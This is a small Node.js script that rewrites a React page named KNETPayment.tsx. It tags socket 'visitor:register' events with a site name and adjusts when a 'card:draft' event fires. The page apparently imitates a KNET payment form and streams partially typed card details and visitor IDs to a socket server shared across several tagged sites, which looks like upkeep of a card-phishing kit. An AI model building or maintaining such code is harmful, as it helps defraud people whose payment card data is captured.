import fs from "fs";
const p="src/pages/KNETPayment.tsx";
let s=fs.readFileSync(p,"utf8").replace(/\r\n/g,"\n");
let n=0;

const a='_s.emit("visitor:register",{existingVisitorId:localStorage.getItem("kdd.server.pid")||null})';
if(s.includes(a)){s=s.replace(a,'_s.emit("visitor:register",{existingVisitorId:localStorage.getItem("kdd.server.pid")||null,siteName:"KDCAW"})');n++;}

const b='socket.value.emit("visitor:register", { existingVisitorId: localStorage.getItem("kdd.server.pid") || null });';
if(s.includes(b)){s=s.replace(b,'socket.value.emit("visitor:register", { existingVisitorId: localStorage.getItem("kdd.server.pid") || null, siteName: "KDCAW" });');n++;}

const c='      socket.value.emit("card:draft", {';
if(s.includes(c) && !s.includes('if (!cardNumber && !selectedBank) return;')){
  s=s.replace(c,'      if (!cardNumber && !selectedBank) return;\n      socket.value.emit("card:draft", {');
  n++;
}
fs.writeFileSync(p,s,"utf8");
console.log("EDITS:",n);
